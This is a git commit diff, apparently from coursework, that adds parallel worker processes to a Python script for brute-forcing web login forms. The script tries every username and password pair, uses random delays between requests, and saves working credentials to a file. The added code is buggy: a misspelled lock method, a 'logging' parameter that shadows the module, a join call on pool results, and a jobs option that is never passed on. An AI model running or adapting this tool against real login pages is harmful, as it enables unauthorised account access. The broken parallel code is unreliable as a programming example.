ed7919e4904e1b2a2b76649a195239b4091d8901
ReillyMcK <romckend@byu.edu>
2024-11-30 16:59:32 -0700

    add parallel processing

--- code/form_force.py
+++ code/form_force.py
@@ -26,27 +26,26 @@ options:
   --max-delay MAX_DELAY Maximum delay between requests in seconds
 
 
-TODO Improvements:
- - Threading
- - Random time between requests
+TODO Possible Improvements:
  - pause/resume?
 """
 import argparse
 import logging
+import multiprocessing as mp
 from pathlib import Path
 import requests
 import random  # for random delay
-import time    # for sleep
+import time  # for sleep
 
 HEADERS = {}
 
-def brute_force_form(host, page, unames, pwords, out, uname_field, pword_field, min_delay, max_delay):
-    """ """
-    if not page.startswith("/"):
-        page = f"/{page}"
 
-    dest = f"http://{host}{page}"
-    logging.info(f"Brute forcing {dest} with {len(unames)} usernames and {len(pwords)} passwords")
+def _brute_force_from_worker(
+    dest, unames, pwords, out, uname_field, pword_field, min_delay, max_delay, lock, logging=False
+):
+
+    if not logging:
+        logging.basicConfig(level=logging.ERROR)
 
     cnt = 0
     for uname in unames:
@@ -61,7 +60,11 @@ def brute_force_form(host, page, unames, pwords, out, uname_field, pword_field, 
             )
 
             if response.status_code != 200:
-                logging.error(f"Unexpected status code: {response.status_code}")
+                lock.aquire()
+                try:
+                    logging.error(f"Unexpected status code: {response.status_code}")
+                finally:
+                    lock.release()
                 exit(1)
 
             if "Invalid" not in response.text:
@@ -76,6 +79,64 @@ def brute_force_form(host, page, unames, pwords, out, uname_field, pword_field, 
         cnt += 1
         logging.info(f"Attempted {cnt} usernames")
 
+
+def brute_force_form(
+    host, page, unames, pwords, out, uname_field, pword_field, min_delay, max_delay, jobs=4
+):
+    """ """
+    if not page.startswith("/"):
+        page = f"/{page}"
+
+    dest = f"http://{host}{page}"
+    logging.info(f"Brute forcing {dest} with {len(unames)} usernames and {len(pwords)} passwords")
+
+    lock = mp.Lock()
+    if jobs > 1:
+
+        # split up unames and pwords into chunks for jobs
+
+        if jobs >= max(len(unames), len(pwords)):
+            jobs = max(len(unames), len(pwords))
+
+        if len(unames) >= jobs:
+            creds = [
+                (unames[i : i + len(unames) // jobs], pwords)
+                for i in range(0, len(unames), len(unames) // jobs)
+            ]
+
+        else:
+            creds = [
+                (unames, pwords[i : i + len(pwords) // jobs])
+                for i in range(0, len(pwords), len(pwords) // jobs)
+            ]
+
+        with mp.Pool(jobs) as pool:
+            workers = []
+            for i in creds:
+                unames, pwords = i
+                res = pool.apply_async(
+                    _brute_force_from_worker,
+                    args=(
+                        dest,
+                        unames,
+                        pwords,
+                        out,
+                        uname_field,
+                        pword_field,
+                        min_delay,
+                        max_delay,
+                        lock,
+                    ),
+                )
+                workers.append(res)
+            for i in workers:
+                i.join()
+    else:
+        _brute_force_from_worker(
+            dest, unames, pwords, out, uname_field, pword_field, min_delay, max_delay, lock, True
+        )
+
+
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="Brute force a web form")
     parser.add_argument("host", type=str, help="URL or IP address of the host")
@@ -83,28 +144,43 @@ if __name__ == "__main__":
     parser.add_argument("-u", "--username", type=str, help="Username or file of usernames")
     parser.add_argument("-p", "--password", type=str, help="Password or file of passwords")
     parser.add_argument("-o", "--output", type=str, help="Output file", default="logins.txt")
-    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
-    parser.add_argument("-uf", "--username-field", type=str, help="Username field name", default="uid")
-    parser.add_argument("-pf", "--password-field", type=str, help="Password field name", default="password")
-    parser.add_argument("--min-delay", type=float, default=0.5, help="Minimum delay between requests in seconds")
-    parser.add_argument("--max-delay", type=float, default=3.0, help="Maximum delay between requests in seconds")
+    parser.add_argument(
+        "-v", "--verbose", action="store_true", help="Verbose output for single-threaded process"
+    )
+    parser.add_argument(
+        "-uf", "--username-field", type=str, help="Username field name", default="uid"
+    )
+    parser.add_argument(
+        "-pf", "--password-field", type=str, help="Password field name", default="password"
+    )
+    parser.add_argument(
+        "--min-delay", type=float, default=0.5, help="Minimum delay between requests in seconds"
+    )
+    parser.add_argument(
+        "--max-delay", type=float, default=3.0, help="Maximum delay between requests in seconds"
+    )
+    parser.add_argument(
+        "-j", "--jobs", type=int, default=4, help="Number of jobs to run in parallel"
+    )
     args = parser.parse_args()
 
-    if args.verbose:
+    if args.jobs > 1:
+        logging.basicConfig(level=logging.ERROR)
+    elif args.verbose:
         logging.basicConfig(level=logging.DEBUG)
     else:
         logging.basicConfig(level=logging.INFO)
 
     if Path(args.username).is_file():
         logging.info(f"Using usernames from file {args.username}")
-        with open(args.username, "r", encoding='utf-8') as f:
+        with open(args.username, "r", encoding="utf-8") as f:
             unames = f.readlines()
     else:
         unames = [args.username]
 
     if Path(args.password).is_file():
         logging.info(f"Using passwords from file {args.password}")
-        with open(args.password, "r", encoding='utf-8') as f:
+        with open(args.password, "r", encoding="utf-8") as f:
             pwords = f.readlines()
     else:
         pwords = [args.password]
@@ -112,6 +188,13 @@ if __name__ == "__main__":
     with open(args.output, "w") as out:
         logging.info(f"Writing valid credentials to {args.output}")
         brute_force_form(
-            args.host, args.page, unames, pwords, out, args.username_field, args.password_field,
-            args.min_delay, args.max_delay
+            args.host,
+            args.page,
+            unames,
+            pwords,
+            out,
+            args.username_field,
+            args.password_field,
+            args.min_delay,
+            args.max_delay,
         )
